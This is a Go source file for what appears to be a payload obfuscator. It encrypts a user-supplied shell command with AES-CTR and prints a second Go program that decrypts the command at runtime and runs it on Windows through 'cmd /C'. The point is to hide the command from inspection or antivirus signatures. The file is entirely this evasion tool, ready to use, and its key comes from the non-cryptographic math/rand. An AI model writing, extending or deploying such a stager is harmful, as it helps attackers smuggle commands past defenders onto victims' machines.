package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"flag"
	"math/rand"
	"os"
	"text/template"
)

type args struct {
	Key        string
	Ciphertext string
}

func checkAndPanic(err error) {
	if err != nil {
		panic(err)
	}
}

func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return nil, err
	}

	return b, nil
}

func encrypt(data string) (string, string) {
	plaintext := []byte(data)
	key, _ := generateRandomBytes(32)
	block, _ := aes.NewCipher(key)
	ciphertext := make([]byte, len(plaintext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(ciphertext, plaintext)

	return base64.StdEncoding.EncodeToString(ciphertext), base64.StdEncoding.EncodeToString(key)
}

func main() {
	body := `
package main

import (
        "crypto/aes"
        "crypto/cipher"
        "encoding/base64"
        "os/exec"
)

func main() {
        ciphertext, _ := base64.StdEncoding.DecodeString("{{.Ciphertext}}")
        key, _ := base64.StdEncoding.DecodeString("{{.Key}}")
        block, _ := aes.NewCipher(key)
        plaintext := make([]byte, len(ciphertext))
        stream := cipher.NewCTR(block, key[aes.BlockSize:])
        stream.XORKeyStream(plaintext, ciphertext)
        c := exec.Command("cmd", "/C", string(plaintext))
        c.Run()
}
`

	command := flag.String("command", "", "The command to execute")
	flag.Parse()

	tmpl, err := template.New("body").Parse(body)
	checkAndPanic(err)

	ciphertext, key := encrypt(*command)
	tmpl.Execute(os.Stdout, args{
		Ciphertext: ciphertext,
		Key:        key,
	})
}
